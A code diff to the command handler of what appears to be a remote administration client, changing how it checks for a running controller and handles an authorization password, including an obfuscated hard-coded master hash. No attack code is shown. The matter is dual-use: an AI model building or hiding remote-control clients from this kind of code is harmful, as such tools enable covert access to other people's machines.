@@ -199,25 +199,26 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	switch (szBuffer[0])
 	{
 	case CMD_AUTHORIZATION: {
-#ifndef _DEBUG
-		HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
+		HANDLE hMutex = OpenMutex(SYNCHRONIZE, FALSE, "MASTER.EXE");
+		hMutex = hMutex ? hMutex : OpenMutex(SYNCHRONIZE, FALSE, "YAMA.EXE");
 		if (hMutex == NULL) // 没有互斥量，主程序可能未运行
 			break;
 		CloseHandle(hMutex);
-		const char* pwdHash = m_conn->pwdHash;
-#else 
-		const char* pwdHash = MASTER_HASH;
-#endif
+
 		char buf[100] = {}, *passCode = buf + 5;
 		memcpy(buf, szBuffer, min(sizeof(buf), ulLength));
+		std::string masterHash(skCrypt(MASTER_HASH));
+		const char* pwdHash = m_conn->pwdHash[0] ? m_conn->pwdHash : masterHash.c_str();
 		if (passCode[0] == 0) {
 			std::string devId = getDeviceID();
 			memcpy(buf + 5, devId.c_str(), devId.length());		// 16字节
 			memcpy(buf + 32, pwdHash, 64);						// 64字节
 			m_ClientObject->Send2Server((char*)buf, sizeof(buf));
 		} else {
-			iniFile cfg;
-			cfg.SetStr("settings", "Password", passCode);
+			config* cfg = pwdHash == masterHash ? new config : new iniFile;
+			cfg->SetStr("settings", "Password", passCode);
+			delete cfg;
+			g_bExit = S_SERVER_EXIT;
 		}
 		break;
 	}
